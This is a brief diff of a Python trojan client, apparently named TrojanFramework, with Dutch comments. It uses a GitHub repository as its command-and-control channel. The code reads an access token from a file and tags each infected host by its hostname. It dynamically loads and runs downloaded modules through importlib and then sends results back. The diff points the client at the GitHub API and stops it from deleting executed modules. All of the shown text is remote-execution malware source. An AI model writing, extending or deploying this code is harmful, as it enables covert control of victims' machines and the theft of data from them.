@@ -15,7 +15,7 @@ with open("accesToken.secret", 'r') as file:
     
 
 # Configuratie van de GitHub-repository
-GITHUB_REPO = "https://github.com/MauroSterckx/TrojanFramework.git"
+GITHUB_REPO = "https://api.github.com/repos/MauroSterckx/TrojanFramework"
 ACCESS_TOKEN = token
 CLIENT_ID = hostname  # kan nog aangepast worden met UUID ofzo?
 
@@ -55,7 +55,7 @@ def execute_module(module_path):
     module = importlib.util.module_from_spec(spec)
     spec.loader.exec_module(module)
     result = module.run()  # Veronderstelt dat elke module een `run()`-functie heeft
-    os.remove(module_path)  # Verwijder de tijdelijke module na uitvoering
+    #os.remove(module_path)  # Verwijder de tijdelijke module na uitvoering
     return result
 
 def send_results(data):
